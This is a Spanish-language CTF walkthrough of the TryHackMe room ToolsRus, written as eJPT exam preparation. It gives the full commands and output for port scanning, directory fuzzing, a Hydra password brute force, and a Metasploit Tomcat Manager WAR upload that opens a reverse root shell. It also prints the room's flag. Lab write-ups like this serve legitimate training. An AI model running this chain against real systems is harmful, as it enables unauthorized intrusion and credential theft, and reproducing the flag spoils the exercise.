---
title: "ToolsRus"
date: 2026-01-08
draft: false
description: "Walkthrough de ToolsRus de TryHackMe. Enumeración web, brute force HTTP con Hydra, explotación de Tomcat Manager con Metasploit — preparación eJPT."
tags:
  [
    "walkthrough",
    "tryhackme",
    "ejpt",
    "linux",
    "tomcat",
    "hydra",
    "metasploit",
    "bruteforce",
    "web",
  ]
categories: ["Walkthroughs"]
series: ["Road to eJPTv2"]
ShowToc: true
TocOpen: false
weight: 10
---

## Resumen

**ToolsRus** es la décima máquina de la serie _Road to eJPTv2_. Una máquina que combina enumeración web en múltiples puertos, brute force sobre autenticación HTTP básica, y explotación del Tomcat Manager mediante Metasploit — resultando en acceso directo como root sin necesidad de escalada.

Un flujo de ataque que refleja escenarios reales donde la reutilización de credenciales entre servicios es el vector principal.

| Atributo       | Valor                                                  |
| -------------- | ------------------------------------------------------ |
| **Plataforma** | TryHackMe                                              |
| **Dificultad** | Fácil                                                  |
| **OS**         | Linux (Ubuntu)                                         |
| **Sala**       | [ToolsRus](https://tryhackme.com/room/toolsrus)        |
| **Skills**     | Web Enum, HTTP Brute Force, Tomcat Manager, Metasploit |

### 🎥 Versión en video

{{< youtube id="1uWq4z6NwTM" start="1" >}}

> Si prefieres seguir el walkthrough paso a paso, continúa leyendo. El video cubre el mismo proceso en formato visual.

### Herramientas usadas

- `nmap` — escaneo de puertos y versiones
- `whatweb` — fingerprinting web
- `gobuster` — fuzzing de directorios web
- `hydra` — brute force sobre HTTP Basic Auth
- `nikto` — escaneo de vulnerabilidades web
- `metasploit` — explotación de Tomcat Manager

### Resumen de la solución

1. **Reconocimiento:** nmap revela cuatro puertos — SSH, HTTP (80), Tomcat (1234) y AJP (8009).
2. **Enumeración web (80):** gobuster encuentra `/guidelines` con un nombre de usuario (`bob`) y `/protected` con autenticación HTTP básica.
3. **Brute force:** Hydra usa rockyou.txt para comprometer `/protected/` con `bob:bubbles`.
4. **Enumeración Tomcat (1234):** gobuster descubre `/manager`. Nikto confirma el panel de administración de Tomcat.
5. **Explotación:** Metasploit (`tomcat_mgr_upload`) usa las credenciales `bob:bubbles` para subir un WAR malicioso y obtener una sesión Meterpreter como root.
6. **Root flag:** Acceso directo a `/root/flag.txt`.

---

## Reconocimiento

### Ping

Verificamos conectividad e identificamos el SO por el TTL:

```bash
ping -c 1 10.64.183.216
```

```
64 bytes from 10.64.183.216: icmp_seq=1 ttl=62 time=69.2 ms
```

TTL 62 → Linux (el valor original es 64, se decrementó en los saltos de red).

### Nmap — Escaneo de puertos

```bash
nmap 10.64.183.216 -n -Pn -sS -p- --open --min-rate=5000 -oG allTCPports
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1234/tcp open  hotline
8009/tcp open  ajp13
```

Cuatro puertos abiertos — más superficie que la máquina anterior. El puerto 1234 y 8009 son inusuales y merecen atención especial.

### Nmap — Versiones y scripts

```bash
nmap 10.64.183.216 -n -Pn -sS -p22,80,1234,8009 -sVC --min-rate=5000 -oN scantoolsrus.txt
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
```

Hallazgos clave:

- Puerto 80: Apache 2.4.18 estándar
- **Puerto 1234: Apache Tomcat 7.0.88** — objetivo principal
- Puerto 8009: AJP13 (protocolo de comunicación interna de Tomcat)

### Whatweb

```bash
whatweb http://10.64.183.216
```

```
http://10.64.183.216 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], IP[10.64.183.216]
```

Confirma Apache 2.4.18 en el puerto 80 sin información adicional relevante.

### Fuzzing web (puerto 80) — gobuster

```bash
gobuster dir -u http://10.64.183.216 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,css,xml,bak -t 50
```

```
/index.html    (Status: 200) [Size: 168]
/guidelines    (Status: 301)
/protected     (Status: 401) [Size: 460]
```

Dos hallazgos importantes:

- `/guidelines` — contenido público con información sobre usuarios
- `/protected` — directorio con **autenticación HTTP básica** (código 401)

Accediendo a `/guidelines` encontramos una referencia al usuario **bob**.

### Brute force — Hydra sobre HTTP Basic Auth

Con el usuario `bob` y el directorio `/protected/` identificado, lanzamos Hydra contra la autenticación básica:

```bash
hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.64.183.216 http-get /protected/
```

```
[80][http-get] host: 10.64.183.216   login: bob   password: bubbles
```

Credenciales obtenidas: `bob:bubbles`

### Fuzzing web (puerto 1234) — gobuster

Enumeramos el Tomcat en el puerto no estándar:

```bash
gobuster dir -u http://10.64.183.216:1234 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,css,xml,bak -t 50
```

```
/docs       (Status: 302)
/examples   (Status: 302)
/manager    (Status: 302)
```

`/manager` es el panel de administración de Tomcat — el objetivo para la explotación.

### Nikto — Reconocimiento del Tomcat Manager

```bash
nikto -host http://10.64.183.216:1234/manager/html
```

Nikto confirma la interfaz de administración de Tomcat en `/manager/html`, además de detectar métodos HTTP peligrosos habilitados (`PUT`, `DELETE`) y documentación expuesta. El Tomcat Manager con credenciales válidas permite subir aplicaciones WAR — vector clásico de RCE.

---

## Explotación

### Metasploit — tomcat_mgr_upload

El módulo `exploit/multi/http/tomcat_mgr_upload` de Metasploit sube un archivo WAR malicioso a través del Tomcat Manager y lo ejecuta para obtener una shell reversa.

```bash
msfconsole -q
msf > use exploit/multi/http/tomcat_mgr_upload
```

Configuramos las opciones con las credenciales obtenidas de Hydra:

```bash
msf exploit(multi/http/tomcat_mgr_upload) > set HttpUsername bob
msf exploit(multi/http/tomcat_mgr_upload) > set HttpPassword bubbles
msf exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 10.64.183.216
msf exploit(multi/http/tomcat_mgr_upload) > set RPORT 1234
msf exploit(multi/http/tomcat_mgr_upload) > set LHOST <TU_IP>
msf exploit(multi/http/tomcat_mgr_upload) > exploit
```

```
[*] Started reverse TCP handler on <TU_IP>:4444
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying WAR payload...
[*] Executing payload...
[*] Meterpreter session 1 opened

meterpreter > getuid
Server username: root
```

Acceso directo como **root** — las credenciales de `/protected/` eran las mismas que las del Tomcat Manager.

---

## Post-Explotación

### Shell interactiva

```bash
meterpreter > shell
Process 1 created.
Channel 1 created.
whoami
root
```

### Root flag

```bash
cd /root
cat flag.txt
ff1fc4a81affcc7688cf89ae7dc6e0e1
```

> **Root flag:** `ff1fc4a81affcc7688cf89ae7dc6e0e1`

No hay flag de usuario separada — el exploit de Tomcat entrega acceso root directamente.

---

## Lecciones aprendidas

- **Los puertos no estándar merecen el mismo nivel de enumeración** — El Tomcat en el puerto 1234 habría pasado desapercibido en un escaneo rápido. Siempre escanear todos los puertos con `-p-`.
- **Los directorios con información pública son pistas valiosas** — `/guidelines` expuso el nombre de usuario `bob`. Enumerar todo el contenido web antes de pasar a la explotación.
- **HTTP 401 no es un callejón sin salida** — Un código 401 significa que hay algo detrás que vale la pena atacar. Identificar el tipo de autenticación (básica, digest, form) y aplicar brute force con las wordlists correctas.
- **La reutilización de credenciales entre servicios es muy común** — `bob:bubbles` funcionó tanto en `/protected/` como en el Tomcat Manager. En post-explotación siempre probar credenciales encontradas en todos los servicios disponibles.
- **Tomcat Manager = RCE garantizado con credenciales válidas** — El panel de administración de Tomcat permite subir archivos WAR. Con acceso al manager, el compromiso total del servidor es trivial. Metasploit tiene un módulo específico para esto.
- **Nikto complementa gobuster** — Mientras gobuster encuentra directorios, nikto analiza la configuración del servidor y detecta problemas como métodos HTTP peligrosos o interfaces expuestas.

### Para la eJPT

| Concepto                      | Relevancia eJPT                               |
| ----------------------------- | --------------------------------------------- |
| Enumeración multi-puerto      | Escaneo completo obligatorio en el examen     |
| HTTP Basic Auth + brute force | Escenario de autenticación web común          |
| Apache Tomcat Manager         | Servicio objetivo en labs de aplicaciones web |
| Metasploit tomcat_mgr_upload  | Módulo de explotación web en el syllabus      |

**Tiempo aproximado de resolución:** 30-40 minutos.

---

## Referencias

- [ToolsRus — TryHackMe](https://tryhackme.com/room/toolsrus)
- [Metasploit — tomcat_mgr_upload](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/)
- [Apache Tomcat Manager exploitation](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat)
- [Nikto](https://github.com/sullo/nikto)
